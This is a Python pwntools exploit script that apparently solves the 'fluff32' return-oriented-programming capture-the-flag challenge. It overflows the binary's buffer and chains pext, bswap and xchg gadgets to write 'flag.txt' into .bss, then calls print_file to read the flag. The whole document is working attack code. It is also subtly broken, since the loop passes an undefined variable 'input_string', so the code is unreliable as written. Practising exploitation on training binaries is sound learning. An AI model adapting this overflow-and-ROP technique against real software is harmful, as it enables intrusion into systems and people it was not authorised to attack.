#!/bin/python3

from pwn import *

context.clear(arch='i386')
filename = './fluff32'

elf = ELF(filename)
io = process(filename)

# variables

pext_str = [0xB4B,0x2DD,0x1D46,0xB5A,0xDB,0xACD,0x1AC5,0xACD]

# gadgets

'''
xchg swaps memory with register:
    temp = dest;
    dest = src;
    src  = temp;

bswap will swap endianess

pext
    mov eax, ebp;
    mov ebx, 0xb0bababa; 
    pext edx, ebx, eax; 
    mov eax, 0xdeadbeef; 
    ret;

    edx = pext(ebx[src], eax[mask])

    see masks.txt

    f = 0xB4B
    l = 0x2DD
    a = 0x1D46
    g = 0xB5A
    . = 0xDB
    t = 0xACD
    x = 0x1AC5
    t = 0xACD
'''

xchg            = p32(0x8048555)    # xchg byte ptr [ecx], dl; ret;
pext            = p32(0x8048543)    # see comment block above
pop_ecx_bswap   = p32(0x8048558)    # pop ecx; bswap ecx; ret;
pop_ebp         = p32(0x80485bb)    # pop ebp; ret;
bss             = elf.bss()

# helper functions

p = make_packer(32, endian='big', sign='unsigned')

def write_string(string, index):
    rop = ROP(elf)

    rop.raw(pop_ebp)
    rop.raw(pext_str[index])    # mask
    rop.raw(pext)
    rop.raw(pop_ecx_bswap)
    rop.raw(p(bss+index))       # big endian
    rop.raw(xchg)               # swap reg/mem*

    return rop.chain()

# main

payload = b""
payload += cyclic(44)

for i in range(0,8):
    payload += write_string(input_string, i)

r = ROP(elf)
r.call('print_file', [bss])

payload += r.chain()

io.recvuntil('>')
io.sendline(payload)
io.recvuntil('!\n')
flag = io.recvline().decode().rstrip()
log.success("Flag: {}".format(flag))